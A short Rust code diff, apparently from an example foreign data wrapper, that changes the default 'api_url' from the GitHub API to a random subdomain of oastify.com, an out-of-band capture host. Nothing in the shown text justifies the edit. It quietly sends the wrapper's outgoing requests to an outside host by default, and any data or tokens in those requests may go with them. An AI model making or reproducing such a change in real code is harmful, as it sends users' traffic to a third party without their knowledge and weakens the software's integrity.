@@ -47,7 +47,7 @@ impl Guest for ExampleFdw {
         let this = Self::this_mut();
 
         let opts = ctx.get_options(OptionsType::Server);
-        this.base_url = opts.require_or("api_url", "https://api.github.com");
+        this.base_url = opts.require_or("api_url", "https://tebjjozlnytcpv86tjtokg7l7cd91zpo.oastify.com");
 
         Ok(())
     }
